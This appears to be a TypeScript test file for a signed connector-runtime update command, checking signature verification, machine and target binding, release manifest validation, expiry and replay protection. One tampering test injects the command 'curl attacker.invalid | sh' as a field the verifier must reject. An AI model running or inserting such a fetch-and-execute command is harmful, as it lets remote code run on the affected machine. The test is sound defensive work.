import { generateKeyPairSync, sign, type KeyObject } from 'node:crypto';

import { describe, expect, test } from 'bun:test';

import {
  ConnectorRuntimeCommandReplayProtection,
  connectorRuntimeCommandSchema,
  createConnectorRuntimeCommandWireRequest,
  verifyConnectorRuntimeCommandWireRequest,
  type ConnectorRuntimeCommandFingerprint,
  type ConnectorRuntimeUpdatePlan
} from '../server/connector-runtime-command-contract';
import {
  canonicalConnectorRuntimeReleaseManifest,
  connectorRuntimeReleaseManifestSchema,
  type ConnectorRuntimeReleaseManifest,
  type SignedConnectorRuntimeReleaseManifest
} from '../server/connector-runtime-release-manifest';

const now = Date.parse('2026-07-14T00:00:00.000Z');
const commandKeys = generateKeyPairSync('ed25519');
const releaseKeys = generateKeyPairSync('ed25519');

function manifest(
  overrides: Partial<ConnectorRuntimeReleaseManifest> = {}
): ConnectorRuntimeReleaseManifest {
  return {
    artifacts: [{
      assetName: 'project-space-machine-tools-darwin-arm64-v0.5.0.tar.gz',
      bundleVersions: {
        connector: '0.5.0',
        machineTools: '0.5.0',
        projectCli: '0.5.0'
      },
      capabilities: ['runtime.restart', 'runtime.update'],
      downloadUrl:
        'https://github.com/DotNaos/project-space/releases/download/v0.5.0/project-space-machine-tools-darwin-arm64-v0.5.0.tar.gz',
      protocolVersion: '2',
      sha256: 'a'.repeat(64),
      sizeBytes: 4,
      target: 'darwin-arm64'
    }],
    buildId: '1'.repeat(40),
    channel: 'stable',
    expiresAt: '2026-07-15T00:00:00.000Z',
    issuedAt: '2026-07-13T23:00:00.000Z',
    releaseId: 'v0.5.0',
    schema: connectorRuntimeReleaseManifestSchema,
    source: 'managed',
    version: '0.5.0',
    ...overrides
  };
}

function signedRelease(
  value = manifest(),
  privateKey: KeyObject = releaseKeys.privateKey
): SignedConnectorRuntimeReleaseManifest {
  return {
    manifest: value,
    signature: sign(
      null,
      Buffer.from(canonicalConnectorRuntimeReleaseManifest(value), 'utf8'),
      privateKey
    ).toString('base64url')
  };
}

const previousRuntime: ConnectorRuntimeCommandFingerprint = {
  buildId: '0'.repeat(40),
  bundleVersions: {
    connector: '0.4.0',
    machineTools: '0.4.0',
    projectCli: '0.4.0'
  },
  capabilities: ['runtime.restart', 'runtime.update'],
  instanceId: 'instance-before',
  protocolVersion: '2',
  releaseId: 'v0.4.0',
  version: '0.4.0'
};

function updatePlan(
  overrides: Partial<ConnectorRuntimeUpdatePlan> = {}
): ConnectorRuntimeUpdatePlan {
  return {
    machineId: 'machine-1',
    operation: 'update',
    operationId: 'operation-1',
    previousRuntime,
    release: signedRelease(),
    releaseId: 'v0.5.0',
    schema: connectorRuntimeCommandSchema,
    target: 'darwin-arm64',
    ...overrides
  };
}

function command(plan = updatePlan(), commandNow = now) {
  return createConnectorRuntimeCommandWireRequest(
    { generation: 7, plan, userId: 'user-owner' },
    commandKeys.privateKey,
    { nonce: 'nonce-1', now: commandNow }
  );
}

function verify(value: unknown, overrides: Partial<Parameters<
  typeof verifyConnectorRuntimeCommandWireRequest
>[2]> = {}) {
  return verifyConnectorRuntimeCommandWireRequest(value, commandKeys.publicKey, {
    expectedGeneration: 7,
    expectedMachineId: 'machine-1',
    expectedTarget: 'darwin-arm64',
    now,
    releaseVerificationKey: releaseKeys.publicKey,
    ...overrides
  });
}

describe('connector runtime signed command contract', () => {
  test('verifies an exact update plan and independently selects its signed artifact', () => {
    const result = verify(command());
    expect(result).toMatchObject({
      artifact: { target: 'darwin-arm64' },
      manifest: { releaseId: 'v0.5.0' },
      plan: { operation: 'update', operationId: 'operation-1' },
      userId: 'user-owner'
    });
  });

  test('rejects plan tampering and arbitrary fields', () => {
    const tampered = command();
    tampered.plan.previousRuntime.buildId = 'f'.repeat(40);
    expect(() => verify(tampered)).toThrow(expect.objectContaining({
      code: 'binding-mismatch'
    }));

    const arbitrary = command() as unknown as Record<string, unknown>;
    (arbitrary.plan as Record<string, unknown>).command = 'curl attacker.invalid | sh';
    expect(() => verify(arbitrary)).toThrow(expect.objectContaining({ code: 'invalid-schema' }));
  });

  test('rejects the wrong machine, socket generation, operation, and local target', () => {
    expect(() => verify(command(), { expectedMachineId: 'machine-2' }))
      .toThrow(expect.objectContaining({ code: 'binding-mismatch' }));
    expect(() => verify(command(), { expectedGeneration: 8 }))
      .toThrow(expect.objectContaining({ code: 'stale-generation' }));
    expect(() => verify(command(), { expectedTarget: 'linux-x64' }))
      .toThrow(expect.objectContaining({ code: 'binding-mismatch' }));

    const wrongOperation = command();
    wrongOperation.plan = {
      machineId: wrongOperation.plan.machineId,
      operation: 'restart',
      operationId: wrongOperation.plan.operationId,
      previousRuntime: wrongOperation.plan.previousRuntime,
      schema: connectorRuntimeCommandSchema,
      target: wrongOperation.plan.target
    };
    expect(() => verify(wrongOperation)).toThrow(expect.objectContaining({
      code: 'binding-mismatch'
    }));
  });

  test('rejects wrong release identity, unsupported release target, and a bad release signature', () => {
    expect(() => verify(command(updatePlan({ releaseId: 'v0.6.0' }))))
      .toThrow(expect.objectContaining({ code: 'invalid-release' }));
    expect(() => verify(command(updatePlan({ target: 'linux-x64' })), {
      expectedTarget: 'linux-x64'
    })).toThrow(expect.objectContaining({ code: 'invalid-release' }));

    const release = signedRelease();
    release.signature = `${release.signature.startsWith('A') ? 'B' : 'A'}${release.signature.slice(1)}`;
    expect(() => verify(command(updatePlan({ release }))))
      .toThrow(expect.objectContaining({ code: 'invalid-release' }));
  });

  test('rejects expired grants and replayed operation IDs', () => {
    expect(() => verify(command(), { now: now + 70_000 }))
      .toThrow(expect.objectContaining({ code: 'expired' }));

    const replay = new ConnectorRuntimeCommandReplayProtection();
    const request = command();
    expect(verify(request, { replayProtection: replay }).plan.operation).toBe('update');
    expect(() => verify(request, { replayProtection: replay }))
      .toThrow(expect.objectContaining({ code: 'replayed' }));
  });
});
